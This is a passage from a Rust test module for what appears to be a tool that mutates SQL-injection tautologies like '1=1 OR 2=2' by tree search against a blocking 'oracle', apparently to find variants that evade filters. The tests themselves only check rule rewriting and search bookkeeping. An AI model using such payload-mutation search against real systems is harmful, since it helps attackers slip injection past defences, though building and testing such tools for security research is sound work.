        let wrapped = format!("{WRAP_PREFIX}(1=1 OR 2=2)");
        let stmts = Parser::parse_sql(&GenericDialect {}, &wrapped).unwrap();
        let result = apply_rule(&stmts[0], RuleId::COMMUTE_OR, 0);
        // commute_or swaps the two sides of OR — fragment changes.
        assert!(result.is_some());
    }

    #[test]
    fn mcts_search_zero_budget_returns_none_or_empty() {
        let mut oracle = AlwaysBlockedOracle;
        let result = mcts_search("1=1", 0, f64::sqrt(2.0), &mut oracle);
        // With budget=0, no oracle calls are made.  May return None
        // (no applicable arms) or a zero-query result.
        if let Some(r) = result {
            assert_eq!(r.oracle_queries, 0);
        }
    }

    #[test]
    fn mcts_rule_id_all_unique() {
        let ids: std::collections::HashSet<u8> = RuleId::ALL.iter().map(|r| r.0).collect();
        assert_eq!(ids.len(), RuleId::ALL.len(), "all rule IDs must be unique");
    }
}
